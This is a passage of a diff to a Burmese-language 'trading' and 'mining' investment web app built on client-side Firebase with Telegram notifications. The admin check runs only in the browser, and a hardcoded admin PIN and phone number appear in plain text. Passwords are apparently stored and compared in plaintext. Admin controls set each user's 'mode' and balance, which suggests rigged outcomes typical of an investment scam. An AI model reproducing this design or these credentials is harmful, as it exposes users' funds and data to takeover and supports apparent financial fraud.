                         db.ref('users/'+user+'/balance').transaction(b => (b||0)+reward); 
-                        alert(`ဂုဏ်ယူပါသည်! Trading အောင်မြင်ပါသည်။ \n\nစုစုပေါင်းအမြတ်ငွေ: ${reward.toLocaleString()} Ks ရရှိပါသည်။ \n(VIP Bonus အပါအဝင်)`); 
-                        sendTelegram(`Trade Win: ${user} earned ${reward} Ks`);
+                        alert(`ဂုဏ်ယူပါသည်! Trading အောင်မြင်ပါသည်။ \n\nစုစုပေါင်းအမြတ်ငွေ: ${reward.toLocaleString()} Ks ရရှိပါသည်။`); 
+                        sendTelegram(`📈 Trade WIN: ${user} earned ${reward} Ks`);
                     } else {
-                        alert("နောင်တမရပါနဲ့! ယခုတစ်ကြိမ် Trading ကျရှုံးပါသည်။ \n\nနောက်တစ်ကြိမ် ဈေးကွက်ကောင်းကို ပြန်လည်စောင့်ဆိုင်းပါ။"); 
-                        sendTelegram(`Trade Loss: ${user} lost ${amt} Ks`);
+                        alert("နောင်တမရပါနဲ့! ယခုတစ်ကြိမ် Trading ကျရှုံးပါသည်။"); 
+                        sendTelegram(`📉 Trade LOSS: ${user} lost ${amt} Ks`);
                     }
                     document.getElementById('trade-timer').innerText = "READY"; 
                 } 
@@ -836,7 +870,7 @@
                             <span>Exp: ${data.expiryDate || 'N/A'}</span>
                         </div>
                     </div>
-                    ${(data.status === 'running' && now >= data.expiryTime) || (data.status === 'running' && data.forceClaim) ? 
+                    ${(data.status === 'running' && now >= data.expiryTime) ? 
                         `<button class="btn btn-main" onclick="applyClickGold(this); claimMining('${r.key}', ${data.totalProfit})" style="padding:10px; font-size:11px; margin-top:10px;">အမြတ်ငွေ အားလုံးထုတ်ယူမည်</button>` : ''}
                 </div>`;
             });
@@ -860,9 +894,11 @@
 
             db.ref('users/'+user).update({ balance: uData.balance - amt });
             db.ref('requests/mining').push({ 
-                ph:user, node:node, amt:amt, status:'pending', date: now.toLocaleString(), expiryDate: expiry.toLocaleDateString(), expiryTime: expiry.getTime(), startTime: now.getTime(), totalProfit: Math.floor(amt + (amt*(percent/100)*days)), daysDuration: days 
+                ph:user, node:node, amt:amt, status:'pending', date: now.toLocaleString(), 
+                expiryDate: expiry.toLocaleDateString(), expiryTime: expiry.getTime(), 
+                startTime: now.getTime(), totalProfit: Math.floor(amt + (amt*(percent/100)*days)), daysDuration: days 
             });
-            sendTelegram(`Mining Request: User ${user} invested ${amt} Ks in ${node} for ${days} days.`);
+            sendTelegram(`⛏️ Mining Request: User ${user} invested ${amt} Ks in ${node} for ${days} days.`);
             alert("Mining တောင်းဆိုမှုအောင်မြင်ပါသည်။ အက်ဒမင်မှ စက်ကိုစတင်လည်ပတ်ပေးရန် ခေတ္တစောင့်ဆိုင်းပေးပါ။");
         });
     }
@@ -872,11 +908,11 @@
             const data = s.val();
             if(data.status === 'completed') return alert("ဤအမြတ်ကို ထုတ်ယူပြီးသားဖြစ်ပါသည်။");
             db.ref('users/'+user).once('value', us => {
-                if(us.val().vip < 1) return alert("VIP Level 1 နှင့်အထက်ရှိသူများသာ အမြတ်ထုတ်ယူနိုင်ပါသည်။ ကျေးဇူးပြု၍ VIP အဆင့်မြှင့်တင်ပါ။");
+                if(us.val().vip < 1) return alert("VIP Level 1 နှင့်အထက်ရှိသူများသာ အမြတ်ထုတ်ယူနိုင်ပါသည်။");
                 if(confirm(`${total.toLocaleString()} Ks ကို Balance ထဲသို့ ထည့်သွင်းမှာ သေချာပါသလား?`)) {
                     db.ref('users/'+user+'/balance').transaction(b => (b||0) + total);
                     db.ref(`requests/mining/${key}`).update({ status: 'completed', endTime: Date.now() });
-                    sendTelegram(`Mining Success: User ${user} claimed ${total} Ks from mining.`);
+                    sendTelegram(`✅ Mining Success: User ${user} claimed ${total} Ks from mining.`);
                     alert("ဂုဏ်ယူပါသည်! Mining အမြတ်ငွေများကို Balance ထဲသို့ ထည့်သွင်းပေးလိုက်ပါပြီ။");
                 }
             });
@@ -898,17 +934,14 @@
     function sendWithdraw() { 
         const amtInput = document.getElementById('wd-amt-input');
         const amt = parseFloat(amtInput.value); 
-        const name = document.getElementById('wd-name-input').value;
-        const ph = document.getElementById('wd-ph-input').value;
+        const name = document.getElementById('wd-name-input').value.trim();
+        const ph = document.getElementById('wd-ph-input').value.trim();
         const pin = document.getElementById('wd-pin-input').value; 
 
-        // --- UPDATED WITHDRAW VALIDATION START ---
         if(!amt || amt < 1000) {
-            amtInput.value = ""; // Clear invalid input
-            return alert("အနည်းဆုံး ၁၀၀၀ ကျပ်ရှိမှ ထုတ်ယူ၍ ရနိုင်ပါမည်။ ၁၀၀၀ ထက်နည်းသော ဂဏန်းများ ထည့်သွင်း၍ မရပါ။");
+            amtInput.value = "";
+            return alert("အနည်းဆုံး ၁၀၀၀ ကျပ်ရှိမှ ထုတ်ယူ၍ ရနိုင်ပါမည်။");
         }
-        // --- UPDATED WITHDRAW VALIDATION END ---
-
         if(!name || !ph || !pin) return alert("ကျေးဇူးပြု၍ ငွေထုတ်ယူမည့် အချက်အလက်များကို အပြည့်အစုံဖြည့်ပါ။");
 
         db.ref('users/'+user).once('value', s => { 
@@ -927,20 +960,20 @@
                                 `⏰ Date: ${new Date().toLocaleString()}`;
             sendTelegram(detailedMsg);
 
-            alert("ငွေထုတ်ယူရန် တောင်းဆိုမှု တင်ပြပြီးပါပြီ။ အက်ဒမင်မှ အတည်ပြုပေးပါလိမ့်မည်။");
+            alert("ငွေထုတ်ယူရန် တောင်းဆိုမှု တင်ပြပြီးပါပြီ။");
             showPage('dash-page');
         }); 
     }
 
     function sendDeposit() { 
         const amt = document.getElementById('dep-amt-input').value; 
-        const trx = document.getElementById('dep-trx-input').value; 
+        const trx = document.getElementById('dep-trx-input').value.trim(); 
         if(!amt || !trx) return alert("အချက်အလက်များကို အပြည့်အစုံဖြည့်ပါ။");
         db.ref('requests/deposits').push({ 
             ph:user, amt, trx, method: currentPayMethod, status:'pending', date:new Date().toLocaleString() 
         }); 
-        sendTelegram(`Deposit Sent: User ${user} sent ${amt} Ks via ${currentPayMethod}. TRX: ${trx}`);
-        alert("ငွေဖြည့်သွင်းမှု တောင်းဆိုပြီးပါပြီ။ ခေတ္တစောင့်ဆိုင်းပေးပါ။");
+        sendTelegram(`💰 Deposit: User ${user} sent ${amt} Ks via ${currentPayMethod}. TRX: ${trx}`);
+        alert("ငွေဖြည့်သွင်းမှု တောင်းဆိုပြီးပါပြီ။");
         showPage('dash-page');
     }
 
@@ -948,44 +981,74 @@
         if(type === 'password') { 
             const oldPw = document.getElementById('old-pw').value; 
             const newPw = document.getElementById('new-pw').value; 
+            if(newPw.length < 6) return alert("လျှို့ဝှက်နံပါတ် အနည်းဆုံး ၆ လုံး ထည့်ပါ။");
             db.ref('users/'+user).once('value', s => { 
-                if(s.val().password === oldPw) { db.ref('users/'+user).update({password: newPw}).then(()=>alert("လျှို့ဝှက်နံပါတ် ပြောင်းလဲမှု အောင်မြင်ပါသည်။")); } 
+                if(s.val().password === oldPw) { 
+                    db.ref('users/'+user).update({password: newPw}).then(()=>alert("လျှို့ဝှက်နံပါတ် ပြောင်းလဲမှု အောင်မြင်ပါသည်။")); 
+                } 
                 else alert("ယခင် လျှို့ဝှက်နံပါတ် မှားယွင်းနေပါသည်။"); 
             }); 
         } else { 
-            db.ref('users/'+user).update({pin: document.getElementById('new-pin').value}).then(()=>alert("Withdraw PIN သိမ်းဆည်းပြီးပါပြီ!")); 
+            const pin = document.getElementById('new-pin').value;
+            if(pin.length !== 6) return alert("PIN နံပါတ် ၆ လုံး ဖြစ်ရပါမည်။");
+            db.ref('users/'+user).update({pin: pin}).then(()=>alert("Withdraw PIN သိမ်းဆည်းပြီးပါပြီ!")); 
         } 
     }
 
-    document.getElementById('admin-trigger').onclick = () => { 
-        if(++adminStep >= 5) { adminStep=0; if(prompt("အက်ဒမင် လျှို့ဝှက်ကုဒ်")==="nannan2333960") { showPage('admin-page'); loadAdmReq(); } } 
+    // ================================================================
+    // 🔐 ADMIN TRIGGER — ဖုန်းနံပါတ် 09951214043 ဖြင့်သာ ဝင်နိုင်မည်
+    // ================================================================
+    document.getElementById('admin-trigger').onclick = () => {
+        if(!user) return alert("ကျေးဇူးပြု၍ အရင်ဆုံး Login ဝင်ပါ။");
+        
+        // Admin Phone စစ်ဆေးခြင်း
+        if(user !== ADMIN_PHONE) {
+            return alert("⛔ ဤနေရာသည် Admin အတွက်သာ ဖြစ်ပါသည်။");
+        }
+        
+        // Admin ဖြစ်ရင် ၃ ကြိမ်နှိပ်ပြီး PIN ထည့်ပါ
+        if(++adminStep >= 3) { 
+            adminStep = 0; 
+            const pin = prompt("🔐 Admin PIN ထည့်ပါ:");
+            if(pin === "nannan2333960") { 
+                showPage('admin-page'); 
+                loadAdmReq(); 
+            } else if(pin !== null) {
+                alert("❌ Admin PIN မှားနေပါသည်။");
+            }
+        }
     };
 
     function admPostAnnounce() {
-        const txt = document.getElementById('adm-msg').value;
-        if(!txt) return;
+        const txt = document.getElementById('adm-msg').value.trim();
+        if(!txt) return alert("အကြောင်းကြားစာ ရေးပါ။");
         db.ref('announcements').push({ text: txt, date: new Date().toLocaleString() });
         alert("Announcement Published!");
     }
 
-    // admUpdatePayDetails() function ကို ဖျက်လိုက်ပါပြီ (Hardcoded ဖြစ်သွားပါပြီ)
-
     function admSearch() { 
-        const ph = document.getElementById('adm-search').value; 
-        db.ref('users/'+ph).on('value', s => { 
+        const ph = document.getElementById('adm-search').value.trim(); 
+        if(!ph) return alert("ဖုန်းနံပါတ် ထည့်ပါ။");
+        db.ref('users/'+ph).once('value', s => { 
             if(s.exists()){ 
                 document.getElementById('adm-ctrl').style.display='block'; 
                 document.getElementById('adm-un').innerText = s.val().username; 
-                document.getElementById('adm-ub').innerText = parseFloat(s.val().balance).toLocaleString() + " Ks"; 
-            } 
+                document.getElementById('adm-ub').innerText = parseFloat(s.val().balance || 0).toLocaleString() + " Ks"; 
+            } else {
+                document.getElementById('adm-ctrl').style.display='none';
+                alert("ဤဖုန်းနံပါတ်ဖြင့် User မတွေ့ပါ။");
+            }
         }); 
     }
 
-    function admMode(m) { db.ref('users/'+document.getElementById('adm-search').value).update({mode: m}).then(() => admSearch()); }
+    function admMode(m) { 
+        db.ref('users/'+document.getElementById('adm-search').value).update({mode: m}).then(() => admSearch()); 
+    }
 
     function loadAdmReq() { 
         db.ref('requests').on('value', s => { 
-            let h = ""; s.forEach(cat => cat.forEach(r => { 
+            let h = ""; 
+            s.forEach(cat => cat.forEach(r => { 
                 if(r.val().status==='pending') { 
                     h += `<div class="card">${cat.key.toUpperCase()} - ${r.val().method || ''}<br>User: ${r.val().ph}<br>Amt: ${r.val().amt}<br>TRX: ${r.val().trx || 'N/A'}<br>
                     <div style="display:flex; gap:10px; margin-top:10px;">
@@ -1021,11 +1084,21 @@
     }
 
     function admUpdateBal() { 
-        db.ref('users/'+document.getElementById('adm-search').value+'/balance').transaction(b=>(b||0)+parseFloat(document.getElementById('adm-adj').value)); 
+        const adj = parseFloat(document.getElementById('adm-adj').value);
+        if(isNaN(adj)) return alert("ပမာဏ ထည့်ပါ။");
+        db.ref('users/'+document.getElementById('adm-search').value+'/balance').transaction(b=>(b||0)+adj); 
     }
     
-    function showPage(id) { document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); window.scrollTo(0,0); }
-    function showNav(el, id) { document.querySelectorAll('.nav-item').forEach(i=>i.classList.remove('active')); el.classList.add('active'); showPage(id); }
+    function showPage(id) { 
+        document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); 
+        document.getElementById(id).classList.add('active'); 
+        window.scrollTo(0,0); 
+    }
+    function showNav(el, id) { 
+        document.querySelectorAll('.nav-item').forEach(i=>i.classList.remove('active')); 
+        el.classList.add('active'); 
+        showPage(id); 
+    }
 </script>
 
 <script type="text/javascript">
@@ -1033,7 +1106,6 @@ var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
 (function(){
 var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
 s1.async=true;
-// Tawk.to Property ID 69cd57e58688f41c3a2a7d1b
 s1.src='https://embed.tawk.to/69cd57e58688f41c3a2a7d1b/default';
 s1.charset='UTF-8';
 s1.setAttribute('crossorigin','*');
